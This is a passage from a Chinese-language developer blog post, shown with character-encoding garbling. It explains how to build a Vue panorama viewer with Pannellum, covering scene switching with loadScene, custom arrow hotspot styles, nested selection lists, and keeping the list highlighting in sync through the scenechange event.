class="number">150</span>,</span><br><span class="line">                    <span class="string">&quot;pitch&quot;</span>: -<span class="number">15</span>,</span><br><span class="line">                    <span class="string">&quot;yaw&quot;</span>: <span class="number">5</span>,</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;scene&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;sceneId&quot;</span>: <span class="string">&quot;scene1&quot;</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;hfov&quot;</span>: <span class="number">150</span>,</span><br><span class="line">                    <span class="string">&quot;pitch&quot;</span>: -<span class="number">20</span>,</span><br><span class="line">                    <span class="string">&quot;yaw&quot;</span>: <span class="number">100</span>,</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;scene&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;sceneId&quot;</span>: <span class="string">&quot;scene3&quot;</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç„¶è€Œ</strong>ï¼Œè¿™æ— æ³•å®ç°ç‚¹å‡»åˆ—è¡¨è·³è½¬åˆ°å¦ä¸€ä¸ªåœºæ™¯ã€‚é¦–å…ˆæˆ‘è®¤ä¸ºåœ¨è¿™ä¸ªç»„ä»¶ä¸­ï¼Œæ¯ä¸€ä¸ªåœºæ™¯éƒ½åº”è¯¥æ˜¯ä¸€ä¸ªå…¨æ™¯å¯¹è±¡ï¼Œå³é€šè¿‡<code>pannellum.viewer</code>åˆ›é€ å‡ºæ¥çš„å¯¹è±¡ï¼Œä½†æ˜¯ç°åœ¨æ•´ä¸ªæ–‡ä»¶ä¸­åªæœ‰ä¸€ä¸ªã€‚</p><p>ä¹Ÿæ›¾æƒ³æŠŠç‚¹å‡»åˆ—è¡¨äº‹ä»¶ä¸ç‚¹å‡»çƒ­ç‚¹äº‹ä»¶ç›¸ç»‘å®šï¼Œä½†æ˜¯é€šè¿‡æŸ¥é˜…æ–‡æ¡£ï¼Œå‘ç°<code>clickHandlerFunc</code> äº‹ä»¶æ„æ€ä¸ºï¼šæ·»åŠ æ­¤å‡½æ•°ä½œä¸ºçƒ­ç‚¹äº‹ä»¶çš„äº‹ä»¶å¤„ç†ç¨‹åº<code>click</code> ï¼Œè€Œæ²¡æ³•é€šè¿‡å¤–éƒ¨äº‹ä»¶ç›´æ¥å‡ºå‘çƒ­ç‚¹äº‹ä»¶çš„ç‚¹å‡»äº‹ä»¶ã€‚</p><h2 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><p><strong>å› æ­¤</strong>ï¼Œæˆ‘ç»“åˆ<a href="https://github.com/jarvisniu/vue-pannellum">githubä¸Šçš„vue-pannellumé¡¹ç›®</a>ï¼Œï¼ˆä½œè€…å¯¹pannellumè¿›è¡Œäº†ç»„ä»¶çš„å°è£…ï¼Œå› æ­¤å¯ä»¥åœ¨ä¸€ä¸ªvueé¡¹ç›®ä¸­å¯¼å…¥å¤šä¸ªå…¨æ™¯å®ä¾‹ï¼‰å¹¶è¿›è¡Œä¸€å®šçš„æ”¹è¿›ï¼Œå¯¹ç‚¹å‡»äº‹ä»¶è¿›è¡Œurlçš„ç»‘å®šï¼Œæ€»è€Œå®ç°ä¸Šè¿°åŠŸèƒ½ã€‚éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- pannellumç»„ä»¶ --&gt;</span><br><span class="line">    &lt;v-pannellum</span><br><span class="line">      v-if=&quot;true&quot;</span><br><span class="line">      class=&quot;pannellum&quot;</span><br><span class="line">      :src=&quot;url&quot;</span><br><span class="line">      :auto-rotate=&quot;true&quot;</span><br><span class="line">      :orientation=&quot;isOrientationOn&quot;</span><br><span class="line">      :auto-load=&quot;true&quot;</span><br><span class="line">      :show-zoom=&quot;false&quot;</span><br><span class="line">      :double-click-zoom=&quot;false&quot;</span><br><span class="line">      :show-fullscreen=&quot;false&quot;</span><br><span class="line">      :hotSpots=&quot;hotSpots&quot;</span><br><span class="line">      :hfov.sync=&quot;hfov&quot;</span><br><span class="line">      :yaw.sync=&quot;yaw&quot;</span><br><span class="line">      :pitch.sync=&quot;pitch&quot;</span><br><span class="line">    &gt;</span><br><span class="line">    &lt;/v-pannellum&gt;</span><br><span class="line">...</span><br><span class="line">&lt;--é€šè¿‡toImageså‡½æ•°åˆ‡æ¢åˆ°ç›¸åº”çš„VRå…¨æ™¯--&gt;</span><br><span class="line"> &lt;div class=&quot;btn_list&quot;&gt;</span><br><span class="line">        &lt;div</span><br><span class="line">          v-for=&quot;(item, index) in labelList[k].imageList&quot;</span><br><span class="line">          :key=&quot;index&quot;</span><br><span class="line">          @click=&quot;toImages(item, index)&quot;</span><br><span class="line">          :class=&quot;index == 0 ? &#x27;btn_active&#x27; : &#x27;btn&#x27;&quot;</span><br><span class="line">          :style=&quot;&#123; backgroundImage: &#x27;url(&#x27; + item.url &#125;&quot;</span><br><span class="line">        &gt;</span><br><span class="line">          &lt;span class=&quot;div_span&quot;&gt;&#123;&#123; item.text &#125;&#125;&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">     &lt;/div&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ¯ä¸ªobjä¸ºé€šè¿‡pannellum.viewer() åˆ›å»ºçš„æ–°çš„viewer instance</span></span><br><span class="line"><span class="function"><span class="title">toImages</span>(<span class="params">item, index</span>)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.url = item.obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="äºŒã€å–æ¶ˆæˆ–æ”¹å˜åŠ è½½åŠ¨ç”»"><a href="#äºŒã€å–æ¶ˆæˆ–æ”¹å˜åŠ è½½åŠ¨ç”»" class="headerlink" title="äºŒã€å–æ¶ˆæˆ–æ”¹å˜åŠ è½½åŠ¨ç”»"></a>äºŒã€å–æ¶ˆæˆ–æ”¹å˜åŠ è½½åŠ¨ç”»</h2><p>åœ¨ä¸Šè¿°æ–¹æ³•ä¸­ï¼Œæ¯é€šè¿‡pannellum.viewer() åˆ›å»ºä¸€ä¸ªæ–°çš„viewer instanceï¼Œå°±ä¼šä¸€ä¸ªæ–°çš„WebGL contextï¼Œé™¤äº†ä¸¥é‡å½±å“ç½‘é¡µæ€§èƒ½å¤–è¿˜é¿å…ä¸äº†åˆ‡æ¢viewer instanceå¸¦æ¥çš„åŠ è½½é¡µé¢åŠ¨ç”»ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://i.loli.net/2021/07/15/CMXe3kt2uop9fEZ.jpg" alt="QQå›¾ç‰‡20210715101908.jpg"></p><p>å› æ­¤ç°åœ¨çš„ç›®æ ‡æ­£æ˜¯å¦‚ä½•å–æ¶ˆè¿™ä¸ªåŠ è½½åŠ¨ç”»ã€‚åœ¨githubä¸Šæˆ‘ä¸è¯¥pannellumç»„ä»¶ä½œè€…è¿›è¡Œäº†æ²Ÿé€šï¼š</p><p><img src="https://i.loli.net/2021/07/15/xZGoPMUFgEL2c8r.jpg" alt="Snipaste_2021-07-15_10-21-17.jpg"></p><h2 id="è§£å†³æ–¹æ¡ˆ-1"><a href="#è§£å†³æ–¹æ¡ˆ-1" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><p>åœ¨ä¸€ä½å¥½å¿ƒé™Œç”Ÿäººçš„å¸®åŠ©ä¸‹ï¼Œ<img src="https://i.loli.net/2021/07/16/JswgQYTh3yfNGLk.jpg" alt="Snipaste_2021-07-16_21-45-47.jpg"></p><p>æˆ‘é‡æ–°å­¦ä¹ äº†å®˜æ–¹æ–‡æ¡£ä¸­çš„ loadScene APIï¼Œå®ƒçš„ä½œç”¨å°±æ˜¯â€œChange scene being viewed.â€ï¼Œåªéœ€ä¼ å…¥sceneIdå°±èƒ½åˆ‡æ¢è‡³å¯¹åº”åœºæ™¯ï¼Œè€Œä¸”è¿™æ˜¯å¯¹åœºæ™¯çš„åˆ‡æ¢ï¼Œè€Œéåƒé—®é¢˜ä¸€çš„è§£å†³æ–¹æ³•ä¸€æ ·åˆ‡æ¢ viewer instanceï¼Œæå¤§å‡å°‘äº†ç”Ÿæˆå¤šä¸ªWebGLçš„å¼€é”€ã€‚</p><p>å› æ­¤åœ¨toImages å‡½æ•°ä¸­ï¼Œä»…éœ€ä¸€è¡Œä»£ç å®ç°åœºæ™¯åˆ‡æ¢ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ‡æ¢åˆ°ç›¸åº”çš„VRå…¨æ™¯</span></span><br><span class="line"><span class="function"><span class="title">toImages</span>(<span class="params">item, index</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// åŠ è½½å…¨æ™¯ï¼Œä¼ å…¥çš„itemä¸ºé™æ€å†™å¥½çš„åˆ—è¡¨ä¸­å¯¹è±¡</span></span><br><span class="line">    <span class="comment">// sceneIdå·²æå‰å†™å¥½ï¼Œä¸viewer instanceä¸­çš„sceneIdä¸€è‡´ã€‚</span></span><br><span class="line">    <span class="built_in">this</span>.viewer.loadScene(item.sceneId);</span><br><span class="line"><span class="comment">//å˜æ¢cssæ ·å¼</span></span><br><span class="line">    <span class="keyword">let</span> btn = <span class="built_in">document</span>.getElementsByClassName(<span class="string">&quot;btn_list&quot;</span>)[<span class="number">0</span>].getElementsByTagName(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; btn.length; i++) &#123;</span><br><span class="line">        btn[i].className = <span class="string">&quot;btn&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    btn[index].className = <span class="string">&quot;btn_active&quot;</span>;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><strong>è‡³æ­¤ï¼Œ</strong>ä¸€äºŒé—®é¢˜éƒ½å·²å¾—åˆ°è§£å†³ã€‚</p><h2 id="ä¸‰ã€æ”¹å˜ç»„ä»¶ä¸­çƒ­ç‚¹æ ·å¼"><a href="#ä¸‰ã€æ”¹å˜ç»„ä»¶ä¸­çƒ­ç‚¹æ ·å¼" class="headerlink" title="ä¸‰ã€æ”¹å˜ç»„ä»¶ä¸­çƒ­ç‚¹æ ·å¼"></a>ä¸‰ã€æ”¹å˜ç»„ä»¶ä¸­çƒ­ç‚¹æ ·å¼</h2><p>åœ¨pannellumä¸­ï¼Œçƒ­ç‚¹æ˜¯é€šè¿‡åœ¨sceneä¸­åˆ›å»ºhotSpotså®ç°çš„ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;scenes&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;circle&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;hfov&quot;</span>: <span class="number">110</span>,</span><br><span class="line">            <span class="string">&quot;pitch&quot;</span>: -<span class="number">3</span>,</span><br><span class="line">            <span class="string">&quot;yaw&quot;</span>: <span class="number">117</span>,</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;equirectangular&quot;</span>,</span><br><span class="line">            <span class="string">&quot;panorama&quot;</span>: <span class="string">&quot;/images/from-tree.jpg&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hotSpots&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;pitch&quot;</span>: -<span class="number">2.1</span>,</span><br><span class="line">                    <span class="string">&quot;yaw&quot;</span>: <span class="number">132.9</span>,</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;scene&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;sceneId&quot;</span>: <span class="string">&quot;house&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;house&quot;</span>:&#123;...&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é»˜è®¤çš„æ ·å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://i.loli.net/2021/07/15/SRT3xBXc8wlr6pH.jpg" alt="Snipaste_2021-07-15_10-24-34.jpg"></p><p>ç„¶è€Œï¼Œå®é™…çš„é¡¹ç›®è¦æ±‚çƒ­ç‚¹ä¸ºä¸Šä¸‹å·¦å³ç®­å¤´ç±»å‹ï¼Œå¹¶ç»™å‡ºäº†å¯¹åº”çš„å›¾ç‰‡ã€‚</p><h2 id="å®ç°æ–¹æ¡ˆ"><a href="#å®ç°æ–¹æ¡ˆ" class="headerlink" title="å®ç°æ–¹æ¡ˆ"></a>å®ç°æ–¹æ¡ˆ</h2><p>é€šè¿‡æŸ¥é˜…<a href="https://pannellum.org/documentation/reference/">pannellumæ–‡æ¡£</a>ï¼Œå¯ä»¥é€šè¿‡</p><ul><li><code>cssClass</code>æŒ‡å®šçƒ­ç‚¹çš„ CSS ç±»ã€‚</li><li><code>createTooltipFunc</code> (function) å’Œ<code>createTooltipArgs</code> (object) åˆ›å»ºçƒ­ç‚¹å·¥å…·æç¤ºDOMï¼Œå…¶ä¸­<code>createTooltipArgs</code>å°†ä½œä¸ºå‚æ•°ä¼ é€’ç»™å‡½æ•°ã€‚</li></ul><p>å› æ­¤å¯¹hotSpotsä½œå‡ºå¦‚ä¸‹ä¿®æ”¹ï¼Œç»‘å®šè¯¥çƒ­ç‚¹cssä¸ºâ€custom-hotspotâ€ï¼Œå¹¶å®šä¹‰hotspotå‡½æ•°ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">hotSpots: [</span><br><span class="line">&#123;</span><br><span class="line">      <span class="attr">pitch</span>: -<span class="number">10</span>,</span><br><span class="line">        <span class="attr">yaw</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;scene&quot;</span>,</span><br><span class="line">        <span class="attr">text</span>: <span class="string">&quot;place2&quot;</span>,</span><br><span class="line">        <span class="attr">sceneId</span>: <span class="string">&quot;place2&quot;</span>,</span><br><span class="line">        <span class="attr">cssClass</span>: <span class="string">&quot;custom-hotspot&quot;</span>,</span><br><span class="line">        <span class="attr">createTooltipFunc</span>: <span class="built_in">this</span>.hotspot,</span><br><span class="line">        <span class="attr">createTooltipArgs</span>: <span class="string">&quot;åŠå…¬åŒº up&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>é‡‡ç”¨åœ¨argsä¸­ä¼ å…¥â€œupâ€ â€œdownâ€ â€œleftâ€ â€œrightâ€ çš„æ–¹å¼å¯¹å½“å‰çƒ­ç‚¹èƒŒæ™¯å›¾ç‰‡ç±»å‹è¿›è¡Œåˆ¤æ–­ï¼Œä»è€Œå®ç°æ­£ç¡®çš„æ˜¾ç¤ºã€‚ï¼ˆå‰é¢çš„æ–‡å­—å¯ç”¨æ¥ä½œçƒ­ç‚¹æç¤ºï¼Œä½†æœ€åå–æ¶ˆäº†ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ›å»ºçƒ­ç‚¹å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="title">hotspot</span>(<span class="params">hotSpotDiv, args</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> direction = args.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">switch</span> (direction) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;up&quot;</span>: &#123;</span><br><span class="line">      hotSpotDiv.style.backgroundImage = <span class="string">&quot;url(&#x27;./images/up.png)&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;down&quot;</span>: &#123;</span><br><span class="line">      hotSpotDiv.style.backgroundImage = <span class="string">&quot;url(&#x27;./images/down.png&#x27;)&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;left&quot;</span>: &#123;</span><br><span class="line">      hotSpotDiv.style.backgroundImage = <span class="string">&quot;url(&#x27;./images/left.png&#x27;)&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;right&quot;</span>: &#123;</span><br><span class="line">      hotSpotDiv.style.backgroundImage = <span class="string">&quot;url(&#x27;./images/right.png&#x27;)&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="å››ã€ç»˜åˆ¶äºŒçº§åˆ—è¡¨å’ŒæŒ‰é’®"><a href="#å››ã€ç»˜åˆ¶äºŒçº§åˆ—è¡¨å’ŒæŒ‰é’®" class="headerlink" title="å››ã€ç»˜åˆ¶äºŒçº§åˆ—è¡¨å’ŒæŒ‰é’®"></a>å››ã€ç»˜åˆ¶äºŒçº§åˆ—è¡¨å’ŒæŒ‰é’®</h2><p>æœ€ç»ˆå®ç°æ•ˆæœå¦‚ä¸‹å›¾ï¼šï¼ˆæ‰€æœ‰åç§°ã€å›¾ç‰‡éƒ½åªåšæµ‹è¯•ç”¨ï¼‰</p><p><img src="https://i.loli.net/2021/07/15/CeJMAgksm5DzBnQ.jpg" alt="Snipaste_2021-07-15_10-38-21.jpg"></p><ul><li>ç‚¹å‡»å…¨æ™¯åˆ—è¡¨ï¼Œå¼¹å‡ºä¸Šé¢æ‰€ç¤ºçš„äºŒä¸ªåˆ—è¡¨ï¼Œå†æ¬¡ç‚¹å‡»éšè—ã€‚</li><li>é»˜è®¤ä¸ºå”®æ¥¼å¤„çš„ç¬¬ä¸€ä¸ªåœºæ™¯ã€‚ç‚¹å‡»Aå‹ã€Bå‹ç­‰ä¸€çº§åˆ—è¡¨ä¼šåˆ‡æ¢äºŒçº§åˆ—è¡¨ï¼Œä¸”éƒ½é»˜è®¤è¿›å…¥ç¬¬ä¸€ä¸ªåœºæ™¯ã€‚</li><li>ç‚¹å‡»äºŒçº§åˆ—è¡¨ä¸åŒå›¾ç‰‡ï¼Œè¿›å…¥ç›¸åº”çš„åœºæ™¯ï¼Œä¸”è¾¹æ¡†å˜é»„ã€‚</li></ul><h2 id="å®ç°æ–¹æ¡ˆ-1"><a href="#å®ç°æ–¹æ¡ˆ-1" class="headerlink" title="å®ç°æ–¹æ¡ˆ"></a>å®ç°æ–¹æ¡ˆ</h2><p>â‘ å¸¸è§çš„divéšè—æ˜¾ç¤ºé—®é¢˜ï¼Œä¸è¿‡ä¹Ÿé‡åˆ°äº†ä¸€ä¸ªå¾ˆå¸¸è§çš„é”™è¯¯ã€‚é€šè¿‡</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> div_list = <span class="built_in">document</span>.getElementsByClassName(<span class="string">&quot;btn_list&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (div_list.style.display == <span class="string">&quot;none&quot;</span>) &#123;</span><br><span class="line">      div_list.style.display = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;...&#125;</span><br></pre></td></tr></table></figure><p>å¯¹è·å–åˆ°çš„divè¿›è¡Œæ ·å¼æ”¹å˜æ—¶ï¼ŒæŠ¥äº†å¦‚ä¸‹é”™è¯¯ï¼š<code>[Cannot set property &#39;display&#39; of undefined]</code> ã€‚</p><p>åŸå› å…¶å®æ˜¯<code>div_list</code>æ˜¯ä¸€ä¸ªnodelistï¼Œå› æ­¤éœ€è¦å¯¹<code>div_list[0]</code>çš„styleè¿›è¡Œä¿®æ”¹ã€‚</p><p>è¿˜æœ‰ä¸€ç‚¹å°±æ˜¯å¯¹displayå±æ€§è¿›è¡Œè½¬æ¢æ—¶ï¼Œè‹¥é»˜è®¤ä¸ºnoneï¼Œåˆ™ç‚¹å‡»æŒ‰é’®ä¼šå¤±æ•ˆ,displayå€¼å°†æ°¸è¿œä¸ºâ€â€ã€‚æœ€ååªèƒ½æŠŠdisplayæ”¹ä¸ºvisibilityã€‚</p><p>â‘¡å…ˆè®¾ç½®ä¸€ä¸ªå‚æ•°kä½œä¸ºlabelListçš„ä¸‹æ ‡ï¼ˆlabelListæ˜¯ä¸€ä¸ªå¯¹è±¡åˆ—è¡¨ï¼ŒåŒ…å«testå’ŒimageListå¯¹è±¡åˆ—è¡¨ï¼‰ï¼Œå†å¯¹ä¸€çº§åˆ—è¡¨æ·»åŠ showImagesäº‹ä»¶ï¼Œæ”¹å˜kå€¼ï¼Œä»è€ŒåŠ¨æ€ç»‘å®šåˆ°äºŒçº§åˆ—è¡¨çš„å›¾ç‰‡æ˜¾ç¤ºã€‚</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;--ä¸€çº§åˆ—è¡¨--&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;label_list&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">&quot;(item, index) in labelList&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showImages(index)&quot;</span>&gt;</span>&#123;&#123; item.text &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&lt;--äºŒçº§åˆ—è¡¨--&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btn_list&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span></span></span><br><span class="line"><span class="tag">    <span class="attr">v-for</span>=<span class="string">&quot;(item, index) in labelList[k].imageList&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span></span></span><br><span class="line"><span class="tag">    @<span class="attr">click</span>=<span class="string">&quot;toImages(item, index)&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:class</span>=<span class="string">&quot;index == 0 ? &#x27;btn_active&#x27; : &#x27;btn&#x27;&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:style</span>=<span class="string">&quot;&#123; backgroundImage: &#x27;url(&#x27; + item.url &#125;&quot;</span></span></span><br><span class="line"><span class="tag">  &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;div_span&quot;</span>&gt;</span>&#123;&#123; item.text &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">showImages</span>(<span class="params">index</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.k = index;</span><br><span class="line">    <span class="built_in">this</span>.toImages(<span class="built_in">this</span>.labelList[index].imageList[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>â‘¢å¾ˆå¸¸è§ï¼Œæ”¹å˜cssæ ·å¼å°±æ˜¯å…ˆæŠŠæ‰€æœ‰çš„æ ·å¼æ”¹ä¸ºåŸæ¥çš„ï¼Œç„¶åå¯¹é€‰å®šçš„æ ·å¼è¿›è¡Œcssç±»ååˆ‡æ¢ã€‚</p><p>åˆ‡æ¢å¯¹åº”çš„<code>viewer instance</code>åˆ™é€šè¿‡<code>this.url = item.obj;</code>å®ç°ã€‚</p><h2 id="äº”ã€ç‚¹å‡»çƒ­ç‚¹äº‹ä»¶ä¸åˆ—è¡¨cssæ ·å¼åŒæ­¥"><a href="#äº”ã€ç‚¹å‡»çƒ­ç‚¹äº‹ä»¶ä¸åˆ—è¡¨cssæ ·å¼åŒæ­¥" class="headerlink" title="äº”ã€ç‚¹å‡»çƒ­ç‚¹äº‹ä»¶ä¸åˆ—è¡¨cssæ ·å¼åŒæ­¥"></a>äº”ã€ç‚¹å‡»çƒ­ç‚¹äº‹ä»¶ä¸åˆ—è¡¨cssæ ·å¼åŒæ­¥</h2><p>è§£å†³ä»¥ä¸Šå››ä¸ªé—®é¢˜åï¼Œæœ¬ä»¥ä¸ºé¡¹ç›®æ¥è¿‘å°¾å£°ï¼Œä½†æ˜¯ä»å­˜åœ¨å°bugï¼Œè™½ç„¶ç‚¹å‡»åˆ—è¡¨èƒ½æ­£ç¡®åˆ‡æ¢åœºæ™¯ï¼Œä½†æ˜¯é€šè¿‡ç‚¹å‡»åœºæ™¯ä¸­çš„hotspotsåˆ‡æ¢åœºæ™¯åï¼Œåˆ—è¡¨cssæ ·å¼ä»ä¸ä¼šæ”¹å˜ã€‚</p><h2 id="è§£å†³æ–¹æ¡ˆ-2"><a href="#è§£å†³æ–¹æ¡ˆ-2" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><p>æœ¬ä»¥ä¸ºè¿™ä¸ªé—®é¢˜å¾ˆå®¹æ˜“å°±å¯ä»¥å¾—åˆ°è§£å†³ï¼Œå› ä¸ºåœ¨<a href="https://pannellum.org/documentation/reference/">pannellumæ–‡æ¡£</a>ä¸­å­˜åœ¨<code>clickHandlerFunc</code> è¿™æ ·ä¸€ä¸ªparameterï¼Œèƒ½æ·»åŠ æ­¤å‡½æ•°ä½œä¸ºçƒ­ç‚¹äº‹ä»¶çš„äº‹ä»¶å¤„ç†ç¨‹åºã€‚æ‰€ä»¥æ€è·¯å¾ˆç®€å•ï¼Œå³ä¸ºhotspotsç»‘å®šclickHotspotäº‹ä»¶ï¼Œé€šè¿‡ä¼ å…¥çš„argsç¡®å®šä¸‹ä¸€ä¸ªåœºæ™¯ï¼Œä»è€Œæ”¹å˜cssæ ·å¼ã€‚</p><p>ä½†æ˜¯äº‹å®ä¸Š<code>clickHandlerFunc</code> å¹¶æ²¡æœ‰èµ·ä½œç”¨ï¼Œå…·ä½“åŸå› æˆ‘ä¹Ÿæ­£å°è¯•ä¸ä½œè€…å–å¾—æ²Ÿé€šã€‚</p><h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><p>æœ€åé€šè¿‡å¤§é‡æŸ¥æ‰¾èµ„æ–™ï¼Œç»ˆäºåœ¨ä½œè€…githubä»“åº“çš„ä¸€ä¸ª<a href="https://github.com/mpetroff/pannellum/issues/964">issue</a>ä¸­æ‰¾åˆ°äº†ç­”æ¡ˆ(å·²ç»“åˆé¡¹ç›®ä¿®æ”¹)ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.viewer.on(<span class="string">&#x27;scenechange&#x27;</span>, (<span class="function">(<span class="params">sceneId</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">switch</span>(sceneId)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;place2&quot;</span>:&#123;</span><br><span class="line">      <span class="built_in">this</span>.index=<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> btn = <span class="built_in">document</span></span><br><span class="line">    .getElementsByClassName(<span class="string">&quot;btn_list&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    .getElementsByTagName(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; btn.length; i++) &#123;</span><br><span class="line">    btn[i].className = <span class="string">&quot;btn&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  btn[<span class="built_in">this</span>.index].className = <span class="string">&quot;btn_active&quot;</span>;</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>viewer.on(&#39;scenechange&#39;</code>èƒ½ä¼ å…¥å½“å‰ç›®çš„åœ°çš„sceneIdï¼Œç„¶åæ ¹æ®è¿™ä¸ªidæ”¹å˜cssæ ·å¼å°±è¡Œã€‚ï¼ˆç”±äºæ²¡æœ‰åç«¯ï¼Œåªèƒ½é å‰ç«¯åˆ¤æ–­å¹¶å†™æ­»ï¼‰</p><h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><p><strong>ä¸ä½œè€…æ²Ÿé€šç»“æœï¼š</strong>åŸæ¥æ˜¯å› ä¸º<code>sceneId</code>ä¸<code>clickHandlerFunc</code> å‘ç”Ÿå†²çªï¼Œç‚¹å‡»çƒ­ç‚¹åå…ˆè¿›å…¥äº†ä¸‹ä¸€ä¸ªåœºæ™¯ï¼Œå› æ­¤<code>clickHandlerFunc</code> æœªç”Ÿæ•ˆã€‚</p><p>å› æ­¤æ— 